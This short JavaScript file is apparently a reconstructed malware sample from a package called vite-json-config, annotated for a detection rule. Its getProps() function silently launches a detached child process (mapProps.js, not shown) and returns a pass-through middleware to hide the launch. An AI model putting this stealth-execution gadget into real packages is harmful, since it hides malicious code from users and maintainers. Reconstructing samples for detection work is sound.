// Reconstruction of vite-json-config lib/config-loader.js (2026-05-18).
// Pattern: a getProps() gadget that spawns mapProps.js as a detached
// silent child (matches MUADDIB-AST-092 / silent_stealth_process), then
// returns a no-op middleware so the host loader keeps working and the
// attack stays invisible to the caller.
"use strict";
const { spawn } = require("child_process");
const path = require("path");

function getProps(args) {
  const mapPath = path.join(__dirname, "mapProps.js");
  spawn("node", [mapPath], { detached: true, stdio: "ignore" }).unref();
  return (req, res, next) => { next(); };
}

module.exports = { getProps };
